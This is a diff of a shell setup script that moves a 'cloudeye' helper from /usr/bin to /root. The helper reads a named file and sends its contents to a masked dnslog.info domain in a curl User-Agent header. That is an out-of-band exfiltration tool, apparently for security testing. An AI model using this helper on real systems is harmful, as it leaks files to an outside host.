@@ -15,14 +15,14 @@ echo 'source edited!'
 
 
 #add cloudeye support to export data
-touch /usr/bin/cloudeye
-cat > /usr/bin/cloudeye <<EOF
+touch /root/cloudeye
+cat > /root/cloudeye <<EOF
 #!/bin/bash
 domain='http://xxx.xxxxxx.dnslog.info'
 file=$1
 curl $domain -H "User-Agent: `cat $file | xargs echo -n `"
 EOF
-chmod 755 /usr/bin/cloudeye
+chmod 755 /root/cloudeye
 
 echo 'cloudeye added!'
 
